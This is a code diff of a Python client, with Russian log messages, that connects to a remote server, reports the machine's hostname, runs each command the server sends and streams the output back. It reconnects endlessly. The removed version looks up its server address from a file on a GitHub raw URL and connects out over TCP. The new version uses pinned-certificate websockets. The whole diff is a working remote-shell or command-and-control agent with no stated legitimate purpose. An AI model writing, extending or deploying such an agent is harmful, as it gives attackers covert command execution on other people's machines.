@@ -1,33 +1,61 @@
-import socket
+import asyncio
+import json
 import subprocess
-import select
-import requests
-import time
+import socket
+import websockets
+import ssl
 
-PORT = 54321
-
-
-def get_init_str():
-    hostname = socket.gethostname()
-    return f"type: init, payload: {hostname}\n"
+import hashlib
 
 
-def send_init(sock):
-    msg = get_init_str()
-    sock.sendall(msg.encode())
-    print(f"отправлен init: {msg.strip()}")
+from cryptography import x509
+from cryptography.hazmat.primitives import serialization
 
 
-def send_done_payload(proc, sock):
+def extract_public_key(cert_bin: bytes) -> str:
+    cert = x509.load_der_x509_certificate(cert_bin)
+
+    pub = cert.public_key()
+
+    der = pub.public_bytes(
+        encoding=serialization.Encoding.DER,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo,
+    )
+
+    return hashlib.sha256(der).hexdigest()
+
+
+def get_ip():
+    ip = "127.0.0.1"
+    print(ip)
+    return ip
+
+
+def fingerprint(key: str):
+    return hashlib.sha256(key.encode()).hexdigest()
+
+
+def get_hostname():
+    return socket.gethostname()
+
+
+async def send_init(ws):
+    msg = {"type": "live", "payload": {"hostname": get_hostname()}}
+    await ws.send(json.dumps(msg))
+    print("live отправлен")
+
+
+async def send_output(ws, proc):
     for line in proc.stdout:
         line = line.rstrip("\n")
         print(line)
 
-        out = f"type: client_line, payload: {line}\n"
-        sock.sendall(out.encode())
+        msg = {"type": "client_line", "payload": line}
+
+        await ws.send(json.dumps(msg))
 
 
-def do_payload(command, sock):
+async def execute_command(command, ws):
     try:
         proc = subprocess.Popen(
             command,
@@ -37,83 +65,73 @@ def do_payload(command, sock):
             text=True,
         )
 
-        send_done_payload(proc, sock)
+        await send_output(ws, proc)
         proc.wait()
 
     except Exception as e:
         print("ошибка выполнения:", e)
 
 
-def handle_response(buffer, sock):
-    print("ответ сервера:", buffer.strip())
+async def handle_message(ws, raw):
+    try:
+        msg = json.loads(raw)
+    except:
+        print("кривой JSON:", raw)
+        return
 
-    if "ok" in buffer:
-        print("сервер подтвердил соединение")
+    msg_type = msg.get("type")
+    payload = msg.get("payload")
 
-    elif "message" in buffer:
-        print("получено сообщение от сервера")
+    print("ответ сервера:", msg)
 
-        if "payload:" in buffer:
-            payload = buffer.split("payload:", 1)[1].strip()
-            do_payload(payload, sock)
-        else:
-            print("payload не найден")
+    if msg_type == "live_ack":
+        print("connected")
 
-    elif "unknown" in buffer:
-        print("сервер не понял сообщение")
+    elif msg_type == "message":
+        print("payload:", payload)
+        await execute_command(payload, ws)
+
+    elif msg_type == "error":
+        print("сервер ругается:", payload)
 
     else:
-        print("неизвестный тип ответа")
+        print("непонятный тип:", msg_type)
 
 
-def run_client(sock):
-    print("клиент запущен")
-
-    send_init(sock)
-
-    while True:
-        readable, _, _ = select.select([sock], [], [], 30)
-
-        if readable:
-            data = sock.recv(1024)
-            if not data:
-                print("сервер отключился")
-                break
-
-            buffer = data.decode()
-            handle_response(buffer, sock)
-
-        else:
-            print("отправка heartbeat...")
-            send_init(sock)
-
-
-def get_ip():
-    url = "https://raw.githubusercontent.com/PusTrace/utils/refs/heads/master/ifconfig.txt"
-    response = requests.get(url, allow_redirects=True)
-    text = response.text
-    return text.strip()
-
-
-def main():
+async def run_client():
     while True:
         try:
-            ip = get_ip()
-        except Exception as e:
-            time.sleep(5)
-            continue
-        print(ip)
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, PORT))
-        except Exception as e:
-            print("ошибка подключения:", e)
-            time.sleep(2 * 60)
-            continue
+            async with websockets.connect(SERVER_URL, ssl=ssl_context) as ws:
+                cert = ws.transport.get_extra_info("ssl_object").getpeercert(
+                    binary_form=True
+                )
 
-        run_client(sock)
-        sock.close()
+                server_pub = extract_public_key(cert)
+
+                print(f"server_pub: {server_pub}\nEXPECTED_FP: {EXPECTED_FP}")
+
+                if server_pub != EXPECTED_FP:
+                    raise Exception("MITM detected")
+                print("сервер подтверждён")
+
+                await send_init(ws)
+
+                while True:
+                    data = await ws.recv()
+                    await handle_message(ws, data)
+
+        except Exception as e:
+            print("ошибка соединения:", e)
+            await asyncio.sleep(5)
 
 
 if __name__ == "__main__":
-    main()
+    ip = get_ip()
+    SERVER_URL = f"wss://{ip}:8000/wss"
+    ssl_context = ssl._create_unverified_context()
+    EXPECTED_FP = "603cb37a9c54024026b6c92884c8d2fa26a7b386ba93904b8f5d10d515e6f057"
+
+    try:
+        asyncio.run(run_client())
+    except KeyboardInterrupt:
+        print("KeyboardInterrupt")
